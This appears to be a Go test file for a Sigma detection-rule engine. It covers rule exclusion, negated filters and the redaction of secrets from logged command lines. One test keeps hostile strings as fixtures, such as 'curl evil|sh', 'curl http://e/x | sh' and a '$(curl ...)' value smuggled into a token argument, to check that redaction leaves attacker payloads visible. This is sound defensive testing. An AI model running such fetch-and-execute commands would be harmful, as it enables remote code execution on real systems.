package sigma

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writeRule(t *testing.T, dir, name, body string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
}

const ruleTmpl = `title: %TITLE%
id: %ID%
status: test
level: high
logsource:
%LOGSOURCE%
detection:
%DETECTION%
  condition: %COND%
`

func rule(title, id, logsource, detection, cond string) string {
	r := strings.NewReplacer("%TITLE%", title, "%ID%", id, "%LOGSOURCE%", logsource, "%DETECTION%", detection, "%COND%", cond)
	return r.Replace(ruleTmpl)
}

func TestInitializeExcludesRulesThatCanNeverMatch(t *testing.T) {
	dir := t.TempDir()
	writeRule(t, dir, "ok.yml", rule("ok", "00000000-0000-0000-0000-000000000001",
		"  product: linux\n  category: process_creation",
		"  sel:\n    Image|endswith: /bash", "sel"))
	writeRule(t, dir, "win.yml", rule("win", "00000000-0000-0000-0000-000000000002",
		"  product: windows\n  category: process_creation",
		"  sel:\n    Image|endswith: \\\\cmd.exe", "sel"))
	writeRule(t, dir, "svc.yml", rule("svc", "00000000-0000-0000-0000-000000000003",
		"  product: linux\n  service: auth",
		"  sel:\n    Image|endswith: /sshd", "sel"))
	writeRule(t, dir, "field.yml", rule("field", "00000000-0000-0000-0000-000000000004",
		"  product: linux\n  category: process_creation",
		"  sel:\n    Hashes|contains: abc", "sel"))
	// Unknown field only inside a negated filter: still satisfiable.
	writeRule(t, dir, "filter.yml", rule("filter", "00000000-0000-0000-0000-000000000005",
		"  product: linux\n  category: process_creation",
		"  sel:\n    Image|endswith: /sh\n  filter:\n    Hashes|contains: abc", "sel and not filter"))

	known := func(service, f string) bool { return f == "Image" }
	c := New(Config{RuleDirs: []string{dir}, MinLevel: "info", FieldKnown: known})
	if err := c.InitializeWithRules([]string{dir}); err != nil {
		t.Fatal(err)
	}

	got := map[string]string{}
	for _, e := range c.Excluded() {
		got[e.Title] = e.Reason
	}
	if len(got) != 3 {
		t.Fatalf("excluded = %v, want win, svc, field", got)
	}
	for title, want := range map[string]string{"win": "windows", "svc": "auth", "field": "Hashes"} {
		if !strings.Contains(got[title], want) {
			t.Errorf("%s reason %q does not mention %q", title, got[title], want)
		}
	}
	if len(c.ruleset.Rules) != 2 {
		t.Fatalf("active rules = %d, want 2", len(c.ruleset.Rules))
	}
}

func TestStrictRulesFailsOnExcluded(t *testing.T) {
	dir := t.TempDir()
	writeRule(t, dir, "ok.yml", rule("ok", "00000000-0000-0000-0000-000000000001",
		"  product: linux", "  sel:\n    Image: /bin/sh", "sel"))
	writeRule(t, dir, "win.yml", rule("win", "00000000-0000-0000-0000-000000000002",
		"  product: windows", "  sel:\n    Image: c", "sel"))
	c := New(Config{RuleDirs: []string{dir}, MinLevel: "info", StrictRules: true})
	if err := c.InitializeWithRules([]string{dir}); err == nil || !strings.Contains(err.Error(), "strict-rules") {
		t.Fatalf("expected strict-rules error, got %v", err)
	}
}

func TestRedactArgvAndProctitle(t *testing.T) {
	f := map[string]string{
		"a0": "mysql", "a1": "--password", "a2": "hunter2", "a3": "--token=abc123", "a4": "-u", "a5": "root",
	}
	redactArgv(f)
	if f["a2"] != "[REDACTED]" || strings.Contains(f["a3"], "abc123") {
		t.Fatalf("secrets not redacted: %v", f)
	}
	if f["a0"] != "mysql" || f["a5"] != "root" {
		t.Fatalf("benign args altered: %v", f)
	}
	if got := sanitizeFieldForLogging("proctitle", "curl --password hunter2 x"); strings.Contains(got, "hunter2") {
		t.Fatalf("proctitle leaked: %s", got)
	}
	if got := sanitizeFieldForLogging("message", "login failed password=s3cret user=a"); strings.Contains(got, "s3cret") {
		t.Fatalf("syslog message leaked: %s", got)
	}
}

// A filter on a field the event lacks must not disable the rule.
func TestNotFilterOnMissingFieldStillMatches(t *testing.T) {
	dir := t.TempDir()
	writeRule(t, dir, "r.yml", rule("r", "00000000-0000-0000-0000-0000000000aa",
		"  product: linux\n  category: process_creation",
		"  sel:\n    Image|endswith: /bash\n  filter:\n    ParentImage: /usr/bin/sshd", "sel and not filter"))
	c := New(Config{RuleDirs: []string{dir}, MinLevel: "info"})
	if err := c.InitializeWithRules([]string{dir}); err != nil {
		t.Fatal(err)
	}
	if n := len(c.EvalFieldsMap(map[string]string{"Image": "/bin/bash"})); n != 1 {
		t.Fatalf("event without ParentImage: %d matches, want 1", n)
	}
	if n := len(c.EvalFieldsMap(map[string]string{"Image": "/bin/bash", "ParentImage": "/usr/bin/sshd"})); n != 0 {
		t.Fatalf("filtered event matched")
	}
	if n := len(c.EvalFieldsMap(map[string]string{"Image": "/bin/bash", "ParentImage": "/usr/bin/cron"})); n != 1 {
		t.Fatalf("unfiltered event did not match")
	}
}

func TestRedactionForms(t *testing.T) {
	leaks := map[string]string{
		"mysql -u root -pS3cret db":                    "S3cret",
		"sshpass -p hunter2 ssh host":                  "hunter2",
		`tool --password "my secret"`:                  "my secret",
		`tool --password='abc def'`:                    "abc def",
		`x password="hunter2"`:                         "hunter2",
		"curl https://admin:hunter2@example.com/x":     "hunter2",
		"curl -u admin:hunter2 https://example.com":    "hunter2",
		"curl -H 'Authorization: Bearer eyJhbGciOi' x": "eyJhbGciOi",
		"AWS_SECRET_ACCESS_KEY=AKIAxyz aws s3 ls":      "AKIAxyz",
		"gpg --passphrase topsecret -d f":              "topsecret",
		"redis-cli -h h -a r3dis":                      "r3dis",
		"tool --api-key=k123 --client-secret cs99":     "k123",
	}
	for in, secret := range leaks {
		if out := sanitizeFieldForLogging("CommandLine", in); strings.Contains(out, secret) {
			t.Errorf("secret %q survived: %q", secret, out)
		}
	}
	argv := map[string]string{"a0": "/usr/bin/mysql", "a1": "-u", "a2": "root", "a3": "-pS3cret",
		"a4": "--password", "a5": "pw", "a6[0]": "token=abc"}
	redactArgv(argv)
	for k, v := range argv {
		if strings.Contains(v, "S3cret") || v == "pw" || strings.Contains(v, "abc") {
			t.Errorf("%s leaked: %q", k, v)
		}
	}
	if argv["a2"] != "root" {
		t.Errorf("benign arg altered: %q", argv["a2"])
	}
	// auditd USER_CMD is hex encoded
	if out := sanitizeFieldForLogging("cmd", "6D7973716C202D7073336372657431"); strings.Contains(out, "s3cret1") {
		t.Errorf("hex cmd leaked: %q", out)
	}
}

// Redaction must not hide attacker payloads or mangle benign words.
func TestRedactionKeepsPayloadsAndBenignWords(t *testing.T) {
	keep := map[string]string{
		`python3 -c "bypass='import os;os.system(\"curl evil|sh\")'"`: "curl evil|sh",
		`x_password='curl http://e/x | sh'`:                           "curl http://e/x | sh",
		`tool --token "$(curl -s http://e/k)"`:                        "$(curl -s http://e/k)",
		`ls --compass=north`:                                          "north",
		`echo bypass=1 compass:2`:                                     "bypass=1 compass:2",
	}
	for in, want := range keep {
		if out := sanitizeFieldForLogging("CommandLine", in); !strings.Contains(out, want) {
			t.Errorf("%q: %q hidden: %q", in, want, out)
		}
	}
	for in, secret := range map[string]string{
		`db_password=hunter2 app`: "hunter2",
		`app --db-pass hunter2`:   "hunter2",
		`pass=hunter2`:            "hunter2",
	} {
		if out := sanitizeFieldForLogging("CommandLine", in); strings.Contains(out, secret) {
			t.Errorf("secret %q survived: %q", secret, out)
		}
	}
}
